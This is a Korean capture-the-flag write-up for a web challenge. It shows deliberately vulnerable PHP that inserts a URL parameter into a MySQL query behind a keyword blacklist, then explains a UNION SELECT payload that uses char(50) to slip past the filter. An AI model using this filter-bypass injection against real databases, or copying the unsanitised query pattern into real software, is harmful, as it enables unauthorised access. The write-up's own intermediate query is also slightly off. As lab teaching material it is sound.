# sql injection - 필터링 우회하기

소스코드

```php+HTML
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 7</title>
</head>
<body>
<?php
$go=$_GET['val'];
if(!$go) { echo("<meta http-equiv=refresh content=0;url=index.php?val=1>"); }
echo("<html><head><title>admin page</title></head><body bgcolor='black'><font size=2 color=gray><b><h3>Admin page</h3></b><p>");
if(preg_match("/2|-|\+|from|_|=|\\s|\*|\//i",$go)) exit("Access Denied!");
$db = dbconnect();
$rand=rand(1,5);
if($rand==1){
  $result=mysqli_query($db,"select lv from chall7 where lv=($go)") or die("nice try!");
}
if($rand==2){
  $result=mysqli_query($db,"select lv from chall7 where lv=(($go))") or die("nice try!");
}
if($rand==3){
  $result=mysqli_query($db,"select lv from chall7 where lv=((($go)))") or die("nice try!");
}
if($rand==4){
  $result=mysqli_query($db,"select lv from chall7 where lv=(((($go))))") or die("nice try!");
}
if($rand==5){
  $result=mysqli_query($db,"select lv from chall7 where lv=((((($go)))))") or die("nice try!");
}
$data=mysqli_fetch_array($result);
if(!$data[0]) { echo("query error"); exit(); }
if($data[0]==1){
  echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=\"alert('Access_Denied!')\"><p>");
}
elseif($data[0]==2){
  echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=\"alert('Hello admin')\"><p>");
  solve(7);
}
?>
<a href=./?view_source=1>view-source</a>
</body>
</html>
```

URL쿼리 `?val=..`부분에 payload를 삽입해야한다. 

소스의 끝에 보면 data[0] == 2 일때, 풀린다. 
그전에 2, +, -, from, _, = 과 같은 문자가 필터링 된다. 
1~5까지의 랜덤값에 따라서 쿼리문을 실행하게 된다.
괄호수에 차이가 있는 것은 별 의미가 없다. 여러번 넣어보면 하나는 맞게 되어있다. 

그러니까, 방법은 기존 $go가 들어가는 쿼리문에서 괄호를 닫고, 이어서 쿼리문을 작성하여 lv=2를 $result에 넣는것.

```sql
-- 기존 쿼리
SELECT lv FROM chall7 WHERE lv=($go)

-- "0)UNION(SELECT(2))#" 삽입
SELECT lv FROM chall7 WHERE lv=()UNION(SELECT(2))--)

-- 2가 필터링에 걸린다. SQL에도 아스키 변환 함수가 있다. => char(50)='2'
-- 삽입payload = 0)UNION(SELECT(char(50)))#
SELECT lv FROM chall7 WHERE lv=(0)UNION(SELECT(char(50)))#)
```

 

> SQL인젝션은 언제나 필터링 함수를 우회하는 것이 핵심이다. 
> 그렇기에 같은 SQL구문도 다르게 나타낼 수 있는 SQL의 깊은 지식이 필요하다. 